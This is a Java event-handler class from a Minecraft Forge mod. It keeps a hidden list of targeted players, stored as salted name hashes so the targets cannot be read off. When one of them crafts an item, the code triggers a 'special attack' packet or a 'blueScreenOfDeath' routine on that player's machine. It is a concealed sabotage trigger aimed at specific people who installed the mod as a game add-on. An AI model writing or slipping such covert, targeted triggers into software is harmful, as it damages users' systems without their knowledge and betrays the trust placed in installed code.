package bruce.projectreflection.event;

import bruce.projectreflection.PRConstants;
import bruce.projectreflection.ProjectReflection;
import bruce.projectreflection.network.MessageClientSpecialAttack;
import bruce.projectreflection.network.PRNetwork;
import net.minecraft.client.Minecraft;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.PlayerEvent;

import java.util.Map;
import java.util.TreeMap;

@Mod.EventBusSubscriber(modid = PRConstants.modid)
public class MiscEvents {
    public static Map<Integer, String> torturedPlayers = new TreeMap<>();

    @SubscribeEvent
    public static void onPlayerCrafted(PlayerEvent.ItemCraftedEvent event) {
        String playerName = event.player.getName();
        for (Map.Entry<Integer, String> entry : torturedPlayers.entrySet()) {
            int hash = entry.getKey();
            String salt = entry.getValue();
            if ((playerName + salt).hashCode() == hash) {
                if (event.player instanceof EntityPlayerMP) {
                    PRNetwork.NETWORK_WRAPPER.sendTo(new MessageClientSpecialAttack(), (EntityPlayerMP) event.player);
                } else if (event.player == Minecraft.getMinecraft().player) {
                    ProjectReflection.proxy.blueScreenOfDeath();
                }
            }
        }
    }
}
